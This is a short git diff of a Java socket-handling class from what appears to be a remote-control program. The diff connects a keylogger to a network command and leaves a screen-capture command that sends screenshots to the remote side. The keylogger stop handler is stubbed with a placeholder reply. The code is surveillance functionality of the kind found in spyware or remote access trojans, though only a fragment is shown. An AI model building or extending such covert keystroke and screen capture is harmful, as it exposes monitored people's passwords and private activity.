@@ -15,8 +15,8 @@ public class WorkerThread extends Thread {
 	private InputStream inputStream = null;
 	private OutputStream outputStream = null;
 	private Socket clientSocket = null;
+	private String record = "";
 	
-
 	public WorkerThread(Socket clientSocket) {
 		try {
 			this.clientSocket = clientSocket;
@@ -50,14 +50,17 @@ public class WorkerThread extends Thread {
 				processStart.start_file();
 				processStart.send_result();
 			}else if(request.equals("KEY_LOGGER_START")) {
-				
+				Connection.keyLogger = new KeyLogger(oos,record);
+				Connection.keyLogger.get_Keylogger(oos);
 			} else if(request.equals("KEY_LOGGER_STOP")) {
-				
+//				Connection.keyLogger.send_KeyLogger();
+				oos.writeObject("Checkkk");
 			} else if(request.equals("SCREEN_CAPTURE")){
 				System.out.println(request);
 				ScreenCapture screenCapture = new ScreenCapture(oos);
 				screenCapture.get_Screenshot();
 				screenCapture.send_ScreenShot();
+				
 			}
 			oos.close();
 			ois.close();
